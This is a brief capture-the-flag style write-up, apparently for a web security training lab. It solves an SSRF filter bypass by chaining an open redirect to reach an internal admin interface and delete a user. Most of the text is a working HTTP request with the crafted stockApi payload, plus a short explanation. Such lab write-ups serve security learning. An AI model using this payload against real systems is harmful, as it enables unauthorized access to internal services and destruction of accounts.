# Lab: SSRF with filter bypass via open redirection vulnerability

> LAB DESC
```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
```
> SOLUTION
## SCRIPT
```
POST /product/stock HTTP/1.1
Host: 0ac0003304fa7378807494db005b009c.web-security-academy.net
Cookie: session=tTzJ0erommqCjUDId7XK7xgvvBOnapWY
Content-Length: 109
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac0003304fa7378807494db005b009c.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac0003304fa7378807494db005b009c.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```
Found the vuln path at `/product/nextProduct` which returned _missing path_, this confirmed the vuln.  
After that I redirected it to `http://192.168.0.12:8080/admin` and put in the request to delete the user named Carlos using `stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin/delete?username=carlos`

That solved the LAB.

>> LAB SOLVED!!!
